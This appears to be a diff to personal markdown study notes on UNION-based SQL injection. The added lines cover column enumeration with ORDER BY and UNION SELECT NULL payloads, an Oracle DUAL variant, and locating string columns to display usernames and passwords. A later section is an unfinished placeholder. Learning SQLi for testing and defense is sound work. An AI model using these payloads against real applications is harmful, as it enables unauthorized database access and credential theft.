@@ -30,32 +30,68 @@ Warning: Take care when injecting the condition `OR 1=1` into a SQL query. Even 
 
 - **METHOD 1** :
 	- Use the `ORDER BY` clause and increasing the number by `1` each time until we hit an error to understand the number of columns returned by the original query. The number where we hit the error subtract `-1` to get number of columns. For example : `error at 3 so total columns = 3 - 1 = 2`.
+		
+	- The number of columns you find here will determine the payload structure of the rest of the steps.
 
 ```sql
 ' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- 
+
+etc...
 ```
 
 
 - **METHOD 2** :
-	- Involves submitting a series of `UNION SELECT` payloads specifying a different number of null values. If the number of nulls does not match the number of columns, the database returns an error.
+	- Involves submitting a series of `UNION SELECT` payloads specifying a different number of null values. If returns no error then number of columns = number of NULLs. If returns error increase number of `NULL`s For example : `' UNION SELECT NULL, NULL--`
+		
+	- The number of columns you find here will determine the payload structure of the rest of the steps.
 
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL FROM DUAL-- 
+
+etc...
+/*
+on oracle every select query requires FROM keyword with a valid table name
+DUAL is an oracle inbuilt table present in the database
+*/
 ```
+
+#### 2.  Finding String Compatible Datatype
+
+- Finding string compatible datatype lets us understand which column is displaying string type data and the order of column in which the string datatype is displayed. Now the idea is if there is a **username** , **password** column we can insert it into this position and the data will be possibly displayed onscreen.
+	
+- If we get an error then we need to move `'a'` to the subsequent positions of `NULL` and recheck until we get no error. If we get no error and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data. That being said sometimes no error but output still might not be displayed.
+
+```sql
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL-- 
+' UNION SELECT NULL,NULL,'a',NULL-- 
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+etc...
 ```
-
-
-#### 2.  
 
 
 ### **PAYLOADS :**
 
 ```sql
 UNION SELECT <columns to check> FROM <table name>
+/*
+the number of columns will vary based on what we find in the requirements phase
+the order, number of columns everything depends on the requirement phase
+so do it carefully to get better results over here.
+*/
 ```
-
-
 
 
 
 ## Blind SQLi Exploitation Techniques
 
 - asdasdasd
+
+
+
